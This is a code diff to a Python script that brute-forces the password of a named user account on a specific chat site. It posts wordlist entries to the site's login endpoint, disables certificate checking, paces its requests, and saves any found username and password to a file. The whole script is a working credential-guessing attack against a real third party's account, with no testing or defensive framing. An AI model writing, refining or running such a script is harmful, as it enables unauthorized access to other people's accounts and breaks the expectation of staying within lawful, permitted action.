@@ -1,34 +1,44 @@
 import requests
+import time
+import urllib3
 
-username = "TorRaider"  # Your known username
-login_url = "https://itamilchat.com/"  # Replace with actual target
-wordlist_path = "merged_wordlist.txt"
+# Disable SSL warnings
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# What string appears on login failure
-failure_indicator = "Invalid password"  # Change based on site response
-
-# Optional headers (adjust as needed)
+url = "https://itamilchat.com/system/action/login.php"
 headers = {
     "User-Agent": "Mozilla/5.0",
     "Content-Type": "application/x-www-form-urlencoded"
 }
 
-with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
-    for count, password in enumerate(f, start=1):
-        password = password.strip()
-        data = {
-            "username": username,
-            "password": password
-        }
+username = "TorRaider"  # Change this
 
-        response = requests.post(login_url, data=data, headers=headers)
+with open("u.txt", "r", encoding="utf-8", errors="ignore") as f:
+    passwords = [line.strip() for line in f]
 
-        # Check if login was successful
-        if failure_indicator not in response.text:
-            print(f"\n✅ Success! Password found: {password}")
+for password in passwords:
+    data = {
+        "token": "0",
+        "cp": "home",
+        "username": username,
+        "password": password
+    }
+
+    try:
+        response = requests.post(url, headers=headers, data=data, verify=False, timeout=10)
+
+        # Adjust this success logic as needed
+        if "logout" in response.text.lower() or "cp=home" in response.text:
+            print(f"\n✅ SUCCESS: Username: {username}, Password: {password}")
+            with open("found.txt", "w") as f_out:
+                f_out.write(f"{username}:{password}\n")
             break
+        else:
+            print(f"[❌] Tried: {password}")
 
-        if count % 1000 == 0:
-            print(f"🔄 Tried {count} passwords...")
+    except requests.exceptions.RequestException as e:
+        print(f"[⚠️ ERROR] {e}")
+        time.sleep(10)
 
-print("❌ Finished trying all passwords (if no success).")
+    time.sleep(2)
+
